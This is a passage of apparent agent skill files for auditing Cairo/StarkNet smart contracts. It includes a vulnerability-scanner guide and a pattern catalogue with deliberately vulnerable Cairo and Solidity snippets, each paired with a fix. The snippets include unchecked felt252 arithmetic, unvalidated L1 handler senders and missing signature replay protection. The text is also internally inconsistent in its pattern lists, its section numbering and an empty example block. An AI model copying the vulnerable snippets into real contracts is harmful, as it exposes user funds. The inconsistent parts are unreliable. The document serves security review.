0x1234...\n- PriceOracle: 0x5678...\n[... etc]\n\n---\n\nPACKAGE READY FOR AUDIT \nNext Step: Share with Trail of Bits assessment team\n```\n\n---\n\n## What You'll Get\n\n**Review Goals Document**:\n- Security objectives\n- Areas of concern\n- Worst-case scenarios\n- Questions for auditors\n\n**Clean Codebase**:\n- Triaged static analysis (or clean report)\n- High test coverage\n- No dead code\n- Clear scope\n\n**Accessibility Package**:\n- File list with scope\n- Build instructions\n- Frozen commit/branch\n- Boilerplate identified\n\n**Documentation Suite**:\n- Flowcharts and diagrams\n- User stories\n- Architecture docs\n- Actor/privilege map\n- Inline code comments\n- Glossary\n- Video walkthroughs (if created)\n\n**Audit Prep Checklist**:\n- [ ] Review goals documented\n- [ ] Static analysis clean/triaged\n- [ ] Test coverage >80%\n- [ ] Dead code removed\n- [ ] Build instructions verified\n- [ ] Stable version frozen\n- [ ] Flowcharts created\n- [ ] User stories documented\n- [ ] Assumptions documented\n- [ ] Actors/privileges listed\n- [ ] Function docs complete\n- [ ] Glossary created\n\n---\n\n## Timeline\n\n**2 weeks before audit**:\n- Set review goals\n- Run static analysis\n- Start fixing issues\n\n**1 week before audit**:\n- Increase test coverage\n- Remove dead code\n- Freeze stable version\n- Start documentation\n\n**Few days before audit**:\n- Complete documentation\n- Verify build instructions\n- Create final checklist\n- Send package to auditors\n\n---\n\n## Ready to Prep\n\nLet me know when you're ready and I'll help you prepare for your security review!\n",
        "plugins/building-secure-contracts/skills/cairo-vulnerability-scanner/SKILL.md": "---\nname: cairo-vulnerability-scanner\ndescription: Scans Cairo/StarkNet smart contracts for 6 critical vulnerabilities including felt252 arithmetic overflow, L1-L2 messaging issues, address conversion problems, and signature replay. Use when auditing StarkNet projects.\n---\n\n# Cairo/StarkNet Vulnerability Scanner\n\n## 1. Purpose\n\nSystematically scan Cairo smart contracts on StarkNet for platform-specific security vulnerabilities related to arithmetic, cross-layer messaging, and cryptographic operations. This skill encodes 6 critical vulnerability patterns unique to Cairo/StarkNet ecosystem.\n\n## 2. When to Use This Skill\n\n- Auditing StarkNet smart contracts (Cairo)\n- Reviewing L1-L2 bridge implementations\n- Pre-launch security assessment of StarkNet applications\n- Validating cross-layer message handling\n- Reviewing signature verification logic\n- Assessing L1 handler functions\n\n## 3. Platform Detection\n\n### File Extensions & Indicators\n- **Cairo files**: `.cairo`\n\n### Language/Framework Markers\n```rust\n// Cairo contract indicators\n#[contract]\nmod MyContract {\n    use starknet::ContractAddress;\n\n    #[storage]\n    struct Storage {\n        balance: LegacyMap<ContractAddress, felt252>,\n    }\n\n    #[external(v0)]\n    fn transfer(ref self: ContractState, to: ContractAddress, amount: felt252) {\n        // Contract logic\n    }\n\n    #[l1_handler]\n    fn handle_deposit(ref self: ContractState, from_address: felt252, amount: u256) {\n        // L1 message handler\n    }\n}\n\n// Common patterns\nfelt252, u128, u256\nContractAddress, EthAddress\n#[external(v0)], #[l1_handler], #[constructor]\nget_caller_address(), get_contract_address()\nsend_message_to_l1_syscall\n```\n\n### Project Structure\n- `src/contract.cairo` - Main contract implementation\n- `src/lib.cairo` - Library modules\n- `tests/` - Contract tests\n- `Scarb.toml` - Cairo project configuration\n\n### Tool Support\n- **Caracal**: Trail of Bits static analyzer for Cairo\n- Installation: `pip install caracal`\n- Usage: `caracal detect src/`\n- **cairo-test**: Built-in testing framework\n- **Starknet Foundry**: Testing and development toolkit\n\n---\n\n## 4. How This Skill Works\n\nWhen invoked, I will:\n\n1. **Search your codebase** for Cairo files\n2. **Analyze each contract** for the 6 vulnerability patterns\n3. **Report findings** with file references and severity\n4. **Provide fixes** for each identified issue\n5. **Check L1-L2 interactions** for messaging vulnerabilities\n\n---\n\n## 5. Example Output\n\nWhen vulnerabilities are found, you'll get a report like this:\n\n```\n=== CAIRO/STARKNET VULNERABILITY SCAN RESULTS ===\n\n\n---\n\n## 5. Vulnerability Patterns (6 Patterns)\n\nI check for 6 critical vulnerability patterns unique to Cairo/Starknet. For detailed detection patterns, code examples, mitigations, and testing strategies, see [VULNERABILITY_PATTERNS.md](resources/VULNERABILITY_PATTERNS.md).\n\n### Pattern Summary:\n\n1. **Unchecked Arithmetic**  CRITICAL - Integer overflow/underflow in felt252\n2. **Storage Collision**  CRITICAL - Conflicting storage variable hashes\n3. **Missing Access Control**  CRITICAL - No caller validation on sensitive functions\n4. **Improper Felt252 Boundaries**  HIGH - Not validating felt252 range\n5. **Unvalidated Contract Address**  HIGH - Using untrusted contract addresses\n6. **Missing Caller Validation**  CRITICAL - No get_caller_address() checks\n\nFor complete vulnerability patterns with code examples, see [VULNERABILITY_PATTERNS.md](resources/VULNERABILITY_PATTERNS.md).\n## 5. Scanning Workflow\n\n### Step 1: Platform Identification\n1. Verify Cairo language and StarkNet framework\n2. Check Cairo version (Cairo 1.0+ vs legacy Cairo 0)\n3. Locate contract files (`src/*.cairo`)\n4. Identify L1-L2 bridge contracts (if applicable)\n\n### Step 2: Arithmetic Safety Sweep\n```bash\n# Find felt252 usage in arithmetic\nrg \"felt252\" src/ | rg \"[-+*/]\"\n\n# Find balance/amount storage using felt252\nrg \"felt252\" src/ | rg \"balance|amount|total|supply\"\n\n# Should prefer u128, u256 instead\n```\n\n### Step 3: L1 Handler Analysis\nFor each `#[l1_handler]` function:\n- [ ] Validates `from_address` parameter\n- [ ] Checks address != zero\n- [ ] Has proper access control\n- [ ] Emits events for monitoring\n\n### Step 4: Signature Verification Review\nFor signature-based functions:\n- [ ] Includes nonce tracking\n- [ ] Nonce incremented after use\n- [ ] Domain separator includes chain ID and contract address\n- [ ] Cannot replay signatures\n\n### Step 5: L1-L2 Bridge Audit\nIf contract includes bridge functionality:\n- [ ] L1 validates address < STARKNET_FIELD_PRIME\n- [ ] L1 implements message cancellation\n- [ ] L2 validates from_address in handlers\n- [ ] Symmetric access controls L1  L2\n- [ ] Test full roundtrip flows\n\n### Step 6: Static Analysis with Caracal\n```bash\n# Run Caracal detectors\ncaracal detect src/\n\n# Specific detectors\ncaracal detect src/ --detectors unchecked-felt252-arithmetic\ncaracal detect src/ --detectors unchecked-l1-handler-from\ncaracal detect src/ --detectors missing-nonce-validation\n```\n\n---\n\n## 6. Reporting Format\n\n### Finding Template\n```markdown\n## [CRITICAL] Unchecked from_address in L1 Handler\n\n**Location**: `src/bridge.cairo:145-155` (handle_deposit function)\n\n**Description**:\nThe `handle_deposit` L1 handler function does not validate the `from_address` parameter. Any L1 contract can send messages to this function and mint tokens for arbitrary users, bypassing the intended L1 bridge access controls.\n\n**Vulnerable Code**:\n```rust\n// bridge.cairo, line 145\n#[l1_handler]\nfn handle_deposit(\n    ref self: ContractState,\n    from_address: felt252,  // Not validated!\n    user: ContractAddress,\n    amount: u256\n) {\n    let current_balance = self.balances.read(user);\n    self.balances.write(user, current_balance + amount);\n}\n```\n\n**Attack Scenario**:\n1. Attacker deploys malicious L1 contract\n2. Malicious contract calls `starknetCore.sendMessageToL2(l2Contract, selector, [attacker_address, 1000000])`\n3. L2 handler processes message without checking sender\n4. Attacker receives 1,000,000 tokens without depositing any funds\n5. Protocol suffers infinite mint vulnerability\n\n**Recommendation**:\nValidate `from_address` against authorized L1 bridge:\n```rust\n#[l1_handler]\nfn handle_deposit(\n    ref self: ContractState,\n    from_address: felt252,\n    user: ContractAddress,\n    amount: u256\n) {\n    // Validate L1 sender\n    let authorized_l1_bridge = self.l1_bridge_address.read();\n    assert(from_address == authorized_l1_bridge, 'Unauthorized L1 sender');\n\n    let current_balance = self.balances.read(user);\n    self.balances.write(user, current_balance + amount);\n}\n```\n\n**References**:\n- building-secure-contracts/not-so-smart-contracts/cairo/unchecked_l1_handler_from\n- Caracal detector: `unchecked-l1-handler-from`\n```\n\n---\n\n## 7. Priority Guidelines\n\n### Critical (Immediate Fix Required)\n- Unchecked from_address in L1 handlers (infinite mint)\n- L1-L2 address conversion issues (funds to zero address)\n\n### High (Fix Before Deployment)\n- Felt252 arithmetic overflow/underflow (balance manipulation)\n- Missing signature replay protection (replay attacks)\n- L1-L2 message failure without cancellation (locked funds)\n\n### Medium (Address in Audit)\n- Overconstrained L1-L2 interactions (trapped funds)\n\n---\n\n## 8. Testing Recommendations\n\n### Unit Tests\n```rust\n#[cfg(test)]\nmod tests {\n    use super::*;\n\n    #[test]\n    fn test_felt252_overflow() {\n        // Test arithmetic edge cases\n    }\n\n    #[test]\n    #[should_panic]\n    fn test_unauthorized_l1_handler() {\n        // Wrong from_address should fail\n    }\n\n    #[test]\n    fn test_signature_replay_protection() {\n        // Same signature twice should fail\n    }\n}\n```\n\n### Integration Tests (with L1)\n```rust\n// Test full L1-L2 flow\n#[test]\nfn test_deposit_withdraw_roundtrip() {\n    // 1. Deposit on L1\n    // 2. Wait for L2 processing\n    // 3. Verify L2 balance\n    // 4. Withdraw to L1\n    // 5. Verify L1 balance restored\n}\n```\n\n### Caracal CI Integration\n```yaml\n# .github/workflows/security.yml\n- name: Run Caracal\n  run: |\n    pip install caracal\n    caracal detect src/ --fail-on high,critical\n```\n\n---\n\n## 9. Additional Resources\n\n- **Building Secure Contracts**: `building-secure-contracts/not-so-smart-contracts/cairo/`\n- **Caracal**: https://github.com/crytic/caracal\n- **Cairo Documentation**: https://book.cairo-lang.org/\n- **StarkNet Documentation**: https://docs.starknet.io/\n- **OpenZeppelin Cairo Contracts**: https://github.com/OpenZeppelin/cairo-contracts\n\n---\n\n## 10. Quick Reference Checklist\n\nBefore completing Cairo/StarkNet audit:\n\n**Arithmetic Safety (HIGH)**:\n- [ ] No felt252 used for balances/amounts (use u128/u256)\n- [ ] OR felt252 arithmetic has explicit bounds checking\n- [ ] Overflow/underflow scenarios tested\n\n**L1 Handler Security (CRITICAL)**:\n- [ ] ALL `#[l1_handler]` functions validate `from_address`\n- [ ] from_address compared against stored L1 contract address\n- [ ] Cannot bypass by deploying alternate L1 contract\n\n**L1-L2 Messaging (HIGH)**:\n- [ ] L1 bridge validates addresses < STARKNET_FIELD_PRIME\n- [ ] L1 bridge implements message cancellation\n- [ ] L2 handlers check from_address\n- [ ] Symmetric validation rules L1  L2\n- [ ] Full roundtrip flows tested\n\n**Signature Security (HIGH)**:\n- [ ] Signatures include nonce tracking\n- [ ] Nonce incremented after each use\n- [ ] Domain separator includes chain ID and contract address\n- [ ] Signature replay tested and prevented\n- [ ] Cross-chain replay prevented\n\n**Tool Usage**:\n- [ ] Caracal scan completed with no critical findings\n- [ ] Unit tests cover all vulnerability scenarios\n- [ ] Integration tests verify L1-L2 flows\n- [ ] Testnet deployment tested before mainnet\n",
        "plugins/building-secure-contracts/skills/cairo-vulnerability-scanner/resources/VULNERABILITY_PATTERNS.md": "## 6. Vulnerability Checklist (6 Patterns)\n\n### 6.1 FELT252 ARITHMETIC OVERFLOW/UNDERFLOW  HIGH\n\n**Description**: The `felt252` type in Cairo represents field elements in range [0, P] where P is the StarkNet prime. Unchecked arithmetic can overflow (wrapping to 0) or underflow (wrapping to P-1), similar to unsigned integers.\n\n**Detection Patterns**:\n```rust\n// VULNERABLE: Direct arithmetic on felt252 without bounds checking\n#[external(v0)]\nfn transfer(ref self: ContractState, to: ContractAddress, amount: felt252) {\n    let sender = get_caller_address();\n    let mut sender_balance = self.balances.read(sender);\n\n    // OVERFLOW/UNDERFLOW: No bounds checking!\n    sender_balance = sender_balance - amount;  // Can underflow to ~P\n    sender_balance = sender_balance + amount;  // Can overflow past P\n\n    self.balances.write(sender, sender_balance);\n}\n\n// VULNERABLE: felt252 arithmetic in calculations\nlet reward = base_reward * multiplier;  // Can overflow\nlet remaining = total - claimed;  // Can underflow\n```\n\n**What to Check**:\n- [ ] Direct arithmetic on `felt252` type without overflow/underflow checks\n- [ ] Balance updates using felt252\n- [ ] Reward/fee calculations using felt252\n- [ ] No explicit validation that values stay within expected range\n- [ ] Consider using default integer types (u8, u16, u32, u64, u128, u256)\n\n**Mitigation**:\n```rust\n// OPTION 1: Use default integer types (RECOMMENDED)\n#[storage]\nstruct Storage {\n    // Use u128 or u256 instead of felt252 for balances\n    balances: LegacyMap<ContractAddress, u128>,\n}\n\n#[external(v0)]\nfn transfer(ref self: ContractState, to: ContractAddress, amount: u128) {\n    let sender = get_caller_address();\n    let sender_balance = self.balances.read(sender);\n\n    // u128 has built-in overflow/underflow protection\n    assert(sender_balance >= amount, 'Insufficient balance');\n\n    self.balances.write(sender, sender_balance - amount);\n    self.balances.write(to, self.balances.read(to) + amount);\n}\n\n// OPTION 2: Explicit checks with felt252\n#[external(v0)]\nfn transfer_felt(ref self: ContractState, to: ContractAddress, amount: felt252) {\n    let sender = get_caller_address();\n    let sender_balance = self.balances_felt.read(sender);\n\n    // Explicit overflow/underflow checks\n    assert(sender_balance >= amount, 'Insufficient balance');\n\n    let new_sender_balance = sender_balance - amount;\n    let recipient_balance = self.balances_felt.read(to);\n    let new_recipient_balance = recipient_balance + amount;\n\n    // Verify no overflow occurred\n    assert(new_recipient_balance >= recipient_balance, 'Overflow');\n\n    self.balances_felt.write(sender, new_sender_balance);\n    self.balances_felt.write(to, new_recipient_balance);\n}\n\n// OPTION 3: SafeMath-style library (if available)\nuse openzeppelin::security::safemath::SafeMath;\n\nlet safe_result = SafeMath::add(balance, amount)?;\n```\n\n**Tool Detection**:\n- Caracal detector: `unchecked-felt252-arithmetic`\n- Look for: felt252 used in balances, arithmetic operations without bounds checks\n\n**References**: building-secure-contracts/not-so-smart-contracts/cairo/arithmetic_overflow\n\n---\n\n### 4.2 L1 TO L2 ADDRESS CONVERSION  HIGH\n\n**Description**: Ethereum L1 addresses are uint256 (256 bits), but StarkNet addresses are felt252 with range [0, P] where P < 2^256. L1 addresses >= P will map to zero address or unexpected address on L2.\n\n**Detection Patterns**:\n```rust\n// VULNERABLE: L1 contract doesn't validate address range\n// L1 Bridge contract (Solidity)\nfunction depositToL2(address l2Recipient, uint256 amount) external {\n    // WRONG: No check that l2Recipient < STARKNET_FIELD_PRIME\n    uint256[] memory payload = new uint256[](2);\n    payload[0] = uint256(uint160(l2Recipient));  // Direct conversion!\n    payload[1] = amount;\n\n    starknetCore.sendMessageToL2(l2Contract, selector, payload);\n}\n\n// VULNERABLE: L2 handler assumes address is valid\n// L2 Contract (Cairo)\n#[l1_handler]\nfn handle_deposit(\n    ref self: ContractState,\n    from_address: felt252,\n    user: ContractAddress,  // Could be zero if L1 address >= P!\n    amount: u256\n) {\n    // No validation that user != 0\n    let current_balance = self.balances.read(user);\n    self.balances.write(user, current_balance + amount);\n}\n```\n\n**What to Check**:\n- [ ] L1 bridge contracts validate addresses before sending to L2\n- [ ] Validation: `0 < address < STARKNET_FIELD_PRIME`\n- [ ] L2 contracts check that addresses != 0\n- [ ] Documentation warns about address conversion issues\n\n**Mitigation**:\n```solidity\n// SECURE: L1 Bridge with address validation (Solidity)\ncontract L1Bridge {\n    // StarkNet field prime (approximately)\n    uint256 constant STARKNET_FIELD_PRIME =\n        0x0800000000000011000000000000000000000000000000000000000000000001;\n\n    function depositToL2(uint256 l2Recipient, uint256 amount) external {\n        // Validate L2 address is within valid range\n        require(l2Recipient != 0, \"Zero address\");\n        require(l2Recipient < STARKNET_FIELD_PRIME, \"Address out of range\");\n\n        uint256[] memory payload = new uint256[](2);\n        payload[0] = l2Recipient;\n        payload[1] = amount;\n\n        starknetCore.sendMessageToL2(l2Contract, selector, payload);\n    }\n}\n```\n\n```rust\n// SECURE: L2 handler with validation (Cairo)\n#[l1_handler]\nfn handle_deposit(\n    ref self: ContractState,\n    from_address: felt252,\n    user: ContractAddress,\n    amount: u256\n) {\n    // Validate user address is not zero\n    let zero_address: ContractAddress = 0.try_into().unwrap();\n    assert(user != zero_address, 'Invalid user address');\n\n    // Validate L1 sender is authorized bridge\n    let expected_l1_bridge: felt252 = self.l1_bridge_address.read();\n    assert(from_address == expected_l1_bridge, 'Unauthorized L1 sender');\n\n    let current_balance = self.balances.read(user);\n    self.balances.write(user, current_balance + amount);\n}\n```\n\n**Testing**:\n```rust\n// Test with edge case addresses\n#[test]\nfn test_large_address_conversion() {\n    // Address close to STARKNET_FIELD_PRIME\n    let large_address = STARKNET_FIELD_PRIME - 1;\n    // Should handle correctly\n\n    let invalid_address = STARKNET_FIELD_PRIME + 1;\n    // Should reject on L1\n}\n```\n\n**References**: building-secure-contracts/not-so-smart-contracts/cairo/l1_to_l2_address_conversion\n\n---\n\n### 4.3 L1 TO L2 MESSAGE FAILURE  HIGH\n\n**Description**: Messages from L1 to L2 may not be processed by the sequencer (due to gas spikes, congestion, etc.). Without a cancellation mechanism, funds sent via failed messages are locked permanently.\n\n**Detection Patterns**:\n```solidity\n// VULNERABLE: L1 bridge without cancellation mechanism\ncontract L1Bridge {\n    function depositToL2(uint256 l2Recipient, uint256 amount) external payable {\n        // Lock funds on L1\n        require(msg.value == amount, \"Incorrect amount\");\n\n        // Send message to L2\n        starknetCore.sendMessageToL2(l2Contract, selector, payload);\n\n        // PROBLEM: If message fails to process on L2, funds locked forever!\n        // No way to cancel and return funds to user\n    }\n}\n```\n\n**What to Check**:\n- [ ] L1 bridge implements message cancellation mechanism\n- [ ] Uses `startL1ToL2MessageCancellation` and `cancelL1ToL2Message`\n- [ ] Cancellation delay period documented\n- [ ] Users can recover funds if L2 message not processed\n\n**Mitigation**:\n```solidity\n// SECURE: L1 Bridge with cancellation support\ncontract L1Bridge {\n    IStarknetCore public starknetCore;\n    uint256 public constant MESSAGE_CANCEL_DELAY = 5 days;\n\n    // Track message hashes for cancellation\n    mapping(bytes32 => address) public messageOwner;\n\n    function depositToL2(\n        uint256 l2Contract,\n        uint256 l2Recipient,\n        uint256 amount\n    ) external payable returns (bytes32 msgHash) {\n        require(msg.value == amount, \"Incorrect amount\");\n\n        uint256[] memory payload = new uint256[](2);\n        payload[0] = l2Recipient;\n        payload[1] = amount;\n\n        // Send message and get hash\n        msgHash = starknetCore.sendMessageToL2{value: msg.value}(\n            l2Contract,\n            DEPOSIT_SELECTOR,\n            payload\n        );\n\n        // Track message owner for cancellation\n        messageOwner[msgHash] = msg.sender;\n\n        emit DepositInitiated(msg.sender, l2Recipient, amount, msgHash);\n        return msgHash;\n    }\n\n    function startCancellation(bytes32 msgHash, uint256 nonce) external {\n        require(messageOwner[msgHash] == msg.sender, \"Not message owner\");\n\n        uint256[] memory payload = new uint256[](2);\n        payload[0] = uint256(uint160(msg.sender));\n        payload[1] = msg.value;\n\n        // Start cancellation process\n        starknetCore.startL1ToL2MessageCancellation(\n            l2Contract,\n            DEPOSIT_SELECTOR,\n            payload,\n            nonce\n        );\n\n        emit CancellationStarted(msgHash, msg.sender);\n    }\n\n    function completeCancellation(\n        bytes32 msgHash,\n        uint256 nonce\n    ) external {\n        require(messageOwner[msgHash] == msg.sender, \"Not message owner\");\n\n        uint256[] memory payload = new uint256[](2);\n        payload[0] = uint256(uint160(msg.sender));\n        payload[1] = msg.value;\n\n        // Complete cancellation (after delay)\n        starknetCore.cancelL1ToL2Message(\n            l2Contract,\n            DEPOSIT_SELECTOR,\n            payload,\n            nonce\n        );\n\n        // Return funds to user\n        (bool success, ) = msg.sender.call{value: msg.value}(\"\");\n        require(success, \"Transfer failed\");\n\n        delete messageOwner[msgHash];\n\n        emit DepositCancelled(msgHash, msg.sender);\n    }\n}\n```\n\n**L2 Considerations**:\n```rust\n// L2 contract should handle idempotent deposits\n#[l1_handler]\nfn handle_deposit(\n    ref self: ContractState,\n    from_address: felt252,\n    user: ContractAddress,\n    amount: u256\n) {\n    // If message is replayed after cancellation attempt,\n    // should handle gracefully (idempotency)\n}\n```\n\n**References**: building-secure-contracts/not-so-smart-contracts/cairo/l1_to_l2_message_failure\n\n---\n\n### 4.4 OVERCONSTRAINED L1 <-> L2 INTERACTION  MEDIUM\n\n**Description**: Asymmetrical validation on L1 vs L2 sides creates situations where funds can be deposited but not withdrawn, or vice versa. Different access control rules trap user funds.\n\n**Detection Patterns**:\n```solidity\n// VULNERABLE: L1 has whitelist, L2 doesn't\ncontract L1Bridge {\n    mapping(address => bool) public whitelist;\n\n    function depositToL2(uint256 l2Recipient, uint256 amount) external {\n        require(whitelist[msg.sender], \"Not whitelisted\");  // Whitelist on L1\n        // Send to L2\n    }\n\n    function withdrawFromL2(uint256 amount) external {\n        // No whitelist check - anyone can withdraw!\n    }\n}\n```\n\n```rust\n// VULNERABLE: L2 allows deposits but L1 blocks withdrawals\n#[l1_handler]\nfn handle_deposit(\n    ref self: ContractState,\n    from_address: felt252,\n    user: ContractAddress,\n    amount: u256\n) {\n    // No restrictions - accepts from any L1 address\n    self.balances.write(user, self.balances.read(user) + amount);\n}\n\n#[external(v0)]\nfn initiate_withdrawal(ref self: ContractState, amount: u256) {\n    // User can initiate withdrawal on L2\n    send_message_to_l1_syscall(to_address, payload);\n}\n\n// But L1 contract has restrictions preventing withdrawal completion!\n```\n\n**What to Check**:\n- [ ] Same validation rules on both L1 and L2\n- [ ] If L1 has whitelist, L2 should too (or vice versa)\n- [ ] If L1 has blacklist, L2 should too\n- [ ] Access controls symmetric across layers\n- [ ] Test full roundtrip: deposit on L1  withdraw on L1\n\n**Mitigation**:\n```solidity\n// SECURE: Symmetric validation on L1\ncontract L1Bridge {\n    mapping(address => bool) public blockedUsers;\n\n    function depositToL2(uint256 l2Recipient, uint256 amount) external {\n        require(!blockedUsers[msg.sender], \"User blocked\");\n        // Process deposit\n    }\n\n    function finalizeWithdrawal(uint256 recipient, uint256 amount) external {\n        // Validate L2 message\n        require(!blockedUsers[msg.sender], \"User blocked\");\n        // Process withdrawal\n    }\n}\n```\n\n```rust\n// SECURE: Symmetric validation on L2\n#[storage]\nstruct Storage {\n    blocked_users: LegacyMap<ContractAddress, bool>,\n}\n\n#[l1_handler]\nfn handle_deposit(\n    ref self: ContractState,\n    from_address: felt252,\n    user: ContractAddress,\n    amount: u256\n) {\n    // Same validation as L1\n    assert(!self.blocked_users.read(user), 'User blocked');\n    self.balances.write(user, self.balances.read(user) + amount);\n}\n\n#[external(v0)]\nfn initiate_withdrawal(ref self: ContractState, amount: u256) {\n    let user = get_caller_address();\n\n    // Same validation as L1\n    assert(!self.blocked_users.read(user), 'User blocked');\n\n    // Process withdrawal\n}\n```\n\n**Testing Strategy**:\n```rust\n// Test full roundtrip scenarios\n#[test]\nfn test_deposit_and_withdraw_roundtrip() {\n    // 1. Deposit on L1\n    // 2. Verify balance on L2\n    // 3. Initiate withdrawal on L2\n    // 4. Finalize withdrawal on L1\n    // 5. Verify funds returned\n\n    // Should succeed for all valid users\n}\n\n#[test]\nfn test_blocked_user_cannot_roundtrip() {\n    // Blocked user should fail at EVERY step\n    // Not just one side\n}\n```\n\n**References**: building-secure-contracts/not-so-smart-contracts/cairo/l1_l2_overconstrained\n\n---\n\n### 4.5 SIGNATURE REPLAY PROTECTION  HIGH\n\n**Description**: Signatures without nonce tracking and domain separation can be replayed: same signature used multiple times on the same chain, or across different chains (mainnet/testnet).\n\n**Detection Patterns**:\n```rust\n// VULNERABLE: No nonce tracking\n#[external(v0)]\nfn execute_with_signature(\n    ref self: ContractState,\n    to: ContractAddress,\n    amount: u128,\n    signature: Array<felt252>\n) {\n    // Verify signature\n    let message_hash = hash_message(to, amount);\n    let signer = recover_signer(message_hash, signature);\n\n    // WRONG: No nonce! Same signature can be replayed infinitely\n    self.transfer_internal(signer, to, amount);\n}\n\n// VULNERABLE: No chain ID in signature\nfn hash_message(to: ContractAddress, amount: u128) -> felt252 {\n    // Missing chain ID - signature valid on mainnet AND testnet!\n    pedersen_hash(to.into(), amount.into())\n}\n```\n\n**What to Check**:\n- [ ] Signatures include nonce that is incremented after each use\n- [ ] Nonce stored per signer address\n- [ ] Signatures include domain separator (chain ID, contract address)\n- [ ] Signature hash includes all relevant parameters\n- [ ] Cannot replay same signature twice\n- [ ] Cannot replay signature from testnet on mainnet\n\n**Mitigation**:\n```rust\n// SECURE: Proper signature with nonce and domain separator\nuse openzeppelin::account::interface::ISRC6;\n\n#[storage]\nstruct Storage {\n    nonces: LegacyMap<ContractAddress, felt252>,\n    // Other storage\n}\n\n#[external(v0)]\nfn execute_with_signature(\n    ref self: ContractState,\n    to: ContractAddress,\n    amount: u128,\n    nonce: felt252,\n    signature: Array<felt252>\n) {\n    // Get signer's current nonce\n    let signer = get_caller_address();\n    let current_nonce = self.nonces.read(signer);\n\n    // Verify nonce matches\n    assert(nonce == current_nonce, 'Invalid nonce');\n\n    // Build message hash with domain separator\n    let message_hash = self.hash_message_with_domain(\n        signer,\n        to,\n        amount,\n        nonce\n    );\n\n    // Verify signature\n    let is_valid = self.verify_signature(signer, message_hash, signature);\n    assert(is_valid, 'Invalid signature');\n\n    // Increment nonce BEFORE execution (reentrancy protection)\n    self.nonces.write(signer, current_nonce + 1);\n\n    // Execute operation\n    self.transfer_internal(signer, to, amount);\n}\n\nfn hash_message_with_domain(\n    self: @ContractState,\n    signer: ContractAddress,\n    to: ContractAddress,\n    amount: u128,\n    nonce: felt252\n) -> felt252 {\n    // Include domain separator for replay protection\n    let domain_separator = self.get_domain_separator();\n\n    // Hash all parameters including domain and nonce\n    let mut message = array![\n        domain_separator,\n        signer.into(),\n        to.into(),\n        amount.into(),\n        nonce\n    ];\n\n    poseidon_hash_span(message.span())\n}\n\nfn get_domain_separator(self: @ContractState) -> felt252 {\n    // EIP-712 style domain separator\n    let chain_id = get_tx_info().unbox().chain_id;\n    let contract_address = get_contract_address();\n\n    poseidon_hash_span(\n        array!['StarkNet Domain', chain_id, contract_address.into()].span()\n    )\n}\n```\n\n**Using OpenZeppelin**:\n```rust\n// BETTER: Use OpenZeppelin Account implementation\nuse openzeppelin::account::Account;\nuse openzeppelin::account::interface::AccountABIDispatcher;\n\n// OpenZeppelin Account automatically handles:\n// - Nonce management\n// - Domain separation\n// - Signature verification\n// - Replay protection\n```\n\n**Testing**:\n```rust\n#[test]\n#[should_panic(expected: ('Invalid nonce',))]\nfn test_cannot_replay_signature() {\n    // Execute with signature once\n    contract.execute_with_signature(to, amount, nonce, signature);\n\n    // Try to replay same signature - should fail\n    contract.execute_with_signature(to, amount, nonce, signature);\n}\n\n#[test]\n#[should_panic]\nfn test_cannot_use_testnet_signature_on_mainnet() {\n    // Generate signature on testnet\n    let testnet_signature = sign_on_testnet(message);\n\n    // Try to use on mainnet - should fail due to domain separator\n    mainnet_contract.execute_with_signature(..., testnet_signature);\n}\n```\n\n**Tool Detection**:\n- Caracal detector: `missing-nonce-validation`\n- Look for: Signature verification without nonce checks\n\n**References**: building-secure-contracts/not-so-smart-contracts/cairo/signature_replay\n\n---\n\n### 4.6 UNCHECKED from_address IN L1 HANDLER  CRITICAL\n\n**Description**: L1 handler functions (`#[l1_handler]`) can be invoked by any L1 contract unless `from_address` is validated. Missing validation allows unauthorized L1 contracts to send messages.\n\n**Detection Patterns**:\n```rust\n// VULNERABLE: No from_address validation\n#[l1_handler]\nfn handle_deposit(\n    ref self: ContractState,\n    from_address: felt252,  // Not validated!\n    user: ContractAddress,\n    amount: u256\n) {\n    // WRONG: Any L1 contract can call this and mint tokens!\n    let current_balance = self.balances.read(user);\n    self.balances.write(user, current_balance + amount);\n}\n\n// VULNERABLE: Only validates on L1 side\n// L1 Contract has access control\nfunction depositToL2() external onlyAuthorized {\n    starknetCore.sendMessageToL2(...);\n}\n\n// But L2 doesn't check - attacker deploys their own L1 contract!\n#[l1_handler]\nfn handle_deposit(ref self: ContractState, from_address: felt252, ...) {\n    // No check that from_address == AUTHORIZED_L1_CONTRACT\n}\n```\n\n**What to Check**:\n- [ ] ALL `#[l1_handler]` functions validate `from_address`\n- [ ] Validation: `from_address == expected_l1_contract_address`\n- [ ] Expected L1 addresses stored in contract storage\n- [ ] Cannot skip validation even if L1 contract has access control\n\n**Mitigation**:\n```rust\n// SECURE: Validate from_address in L1 handler\n#[storage]\nstruct Storage {\n    l1_bridge_address: felt252,\n    balances: LegacyMap<ContractAddress, u256>,\n}\n\n#[constructor]\nfn constructor(ref self: ContractState, l1_bridge: felt252) {\n    self.l1_bridge_address.write(l1_bridge);\n}\n\n#[l1_handler]\nfn handle_deposit(\n    ref self: ContractState,\n    from_address: felt252,\n    user: ContractAddress,\n    amount: u256\n) {\n    // CRITICAL: Validate from_address is authorized L1 bridge\n    let authorized_l1_bridge = self.l1_bridge_address.read();\n    assert(from_address == authorized_l1_bridge, 'Unauthorized L1 sender');\n\n    // Validate user address\n    let zero_address: ContractAddress = 0.try_into().unwrap();\n    assert(user != zero_address, 'Invalid user address');\n\n    // Now safe to process deposit\n    let current_balance = self.balances.read(user);\n    self.balances.write(user, current_balance + amount);\n\n    // Emit event\n    self.emit(DepositProcessed { user, amount, from_l1: from_address });\n}\n\n// Admin function to update L1 bridge (if needed)\n#[external(v0)]\nfn update_l1_bridge(ref self: ContractState, new_l1_bridge: felt252) {\n    // Access control\n    self.ownable.assert_only_owner();\n\n    self.l1_bridge_address.write(new_l1_bridge);\n    self.emit(L1BridgeUpdated { new_address: new_l1_bridge });\n}\n```\n\n**Testing**:\n```rust\n#[test]\n#[should_panic(expected: ('Unauthorized L1 sender',))]\nfn test_unauthorized_l1_sender_rejected() {\n    let unauthorized_address = 0x123; // Wrong L1 address\n\n    // Should reject\n    contract.handle_deposit(\n        from_address: unauthorized_address,\n        user: user_address,\n        amount: 1000\n    );\n}\n\n#[test]\nfn test_authorized_l1_sender_accepted() {\n    let authorized_address = l1_bridge_address;\n\n    // Should succeed\n    contract.handle_deposit(\n        from_address: authorized_address,\n        user: user_address,\n        amount: 1000\n    );\n\n    assert(contract.balances(user_address) == 1000);\n}\n```\n\n**Tool Detection**:\n- Caracal detector: `unchecked-l1-handler-from`\n- Look for: `#[l1_handler]` without `from_address` validation\n\n**References**: 